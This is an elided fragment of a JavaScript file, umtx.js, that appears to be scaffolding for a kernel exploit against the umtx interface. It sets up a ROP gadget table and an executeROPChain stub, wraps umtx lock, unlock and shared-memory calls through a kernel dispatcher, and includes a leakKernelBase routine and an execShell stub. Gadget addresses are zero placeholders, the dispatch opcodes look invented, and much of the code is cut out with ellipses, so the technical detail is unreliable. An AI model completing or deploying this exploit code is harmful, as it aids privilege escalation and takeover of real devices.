...
// Fallback helper definitions for runtime integration
const ROP_GADGETS = {
  pop_rdi: 0x0,
  pop_rsi: 0x0,
  pop_rdx: 0x0,
...
function executeROPChain(chain) {
  if (
    typeof globalThis !== "undefined" &&
    typeof globalThis.executeROPChain === "function"
  ) {
    return globalThis.executeROPChain(chain);
  }
  throw new Error(
    "executeROPChain() is not implemented in umtx.js. Provide a platform-specific ROP executor.",
  );
}

function syscall(...args) {
  if (
    typeof globalThis !== "undefined" &&
    typeof globalThis.syscall === "function"
  ) {
    return globalThis.syscall(...args);
  }
  throw new Error(
    "syscall() is not implemented in umtx.js. Provide a platform-specific syscall helper.",
  );
}

function cleanup() {
  console.warn(
    "cleanup() is not implemented in umtx.js. Implement cleanup logic for your environment.",
  );
}

function execShell() {
  console.warn(
    "execShell() is not implemented in umtx.js. Implement shell execution for your environment.",
  );
}
...
function initUmtxShim() {
  ...
  dispatchKernel(CONSTS.SYS_thr_self, g_payload_base + tidBuf.byteOffset, 4);
...
function rawUmtxLock(umtxAddr, tid) {
  ...
  return dispatchKernel(
    0x1337, // Dispatch opcode for _umtx_lock
    g_payload_base + args.byteOffset,
    16,
  );
}
...
function rawUmtxUnlock(umtxAddr, tid) {
  ...
  args[1] = BigInt(tid);
  return dispatchKernel(
    0x1338, // Dispatch opcode for _umtx_unlock
    g_payload_base + args.byteOffset,
    16,
  );
}
...
function umtxOp(obj, op, val, uaddr1, uaddr2) {
  ...
  return dispatchKernel(
    0x1339, // Dispatch opcode for _umtx_op
    g_payload_base + args.byteOffset,
    40,
  );
}
...
function shmCreate(name, size) {
  ...
  const ret = dispatchKernel(
    0x133a, // UMTX_OP_SHM
    g_payload_base + desc.byteOffset,
    32,
  );
  if (ret === 0) {
...
function shmDestroy(fdOrName) {
  ...
  args[3] = 0;
  return dispatchKernel(0x133a, g_payload_base + args.byteOffset, 32);
}
...
function leakKernelBase() {
  ...
  for (let i = 0; i < 4; i++) {
    ...
    if (
      (val & 0xffffffffff000000) === 0xffffffff80000000 ||
